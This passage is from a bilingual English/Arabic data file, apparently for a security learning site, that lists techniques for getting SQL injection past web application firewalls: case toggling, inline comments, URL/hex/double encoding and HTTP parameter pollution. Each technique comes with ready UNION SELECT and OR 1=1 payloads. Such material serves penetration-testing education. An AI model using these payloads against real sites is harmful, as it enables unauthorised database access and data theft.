          en: "5. WAF Bypass Techniques",
          ar: "5. تقنيات تخطي أنظمة الحماية (WAF)",
        },
        items: [
          {
            en: "Case Toggling & Comment Injection: Bypass signature-based WAFs.",
            ar: "تخطي الفلاتر بالكابيتال والتعليقات: تخطي جدران الحماية (WAF) عبر التعليقات وتباين الأحرف.",
            exploit: {
              en: "Mix upper and lower cases `sEleCt`. If the firewall deletes spaces, use `/**/` inline comments instead of standard whitespace margins to slip past rules.",
              ar: "غير حالة الحروف `SeLeCT` أو استخدم تعليقات `/**/` في الفراغات بين الأوامر حال تم حظر زر المسافة Space Bar.",
            },
            code: [
              "1'/*!50000UnIoN*//*!50000SeLeCt*/ 1,2,3--",
              "1UniOn/**/SeLecT/**/1,2,3",
            ],
          },
          {
            en: "URL / Hex / Unicode Encoding: Obfuscate the payload strings.",
            ar: "التشويش بتشفير URL و Hex و Unicode: تعديل محتوى البايلود لاختراق الرقابة.",
            exploit: {
              en: "URL encode the payload completely, or use Double URL Encoding. Convert malicious keywords to hexadecimal bytes so the regex-based WAF cannot decode them dynamically.",
              ar: "تحويل الحروف إلى Hex أو تشفيرة URL مضاعفة، مما يُعيق برمجيات الـ Regex من رصد كلمة DROP أو SELECT.",
            },
            code: [
              "Double URL Encode: %2527%2520OR%25201%253D1--",
              "Hex encoding strings: SELECT 0x61646d696e",
            ],
          },
          {
            en: "HTTP Parameter Pollution (HPP) in WAFs: Overloading the filter.",
            ar: "تلوث الـ Parameters (HPP): إرباك جدار الفلترة بإرسال معلمات مستنسخة.",
            exploit: {
              en: "Send multiple identical parameters (`?id=1&id=UNION SELECT...`). WAFs often inspect the first occurrence, while the backend application stitches both or processes only the second payload.",
              ar: "إرسال باراميتر مكرر (مثلاً id=1&id=1 OR 1)، بعض برامج الحماية تتفحص الأول، والـ API يستلم الثاني.",
            },
            code: ["?id=1&id=-1' UNION SELECT 1,2,database()--"],
          },
        ],
      },
    ],
  },
];
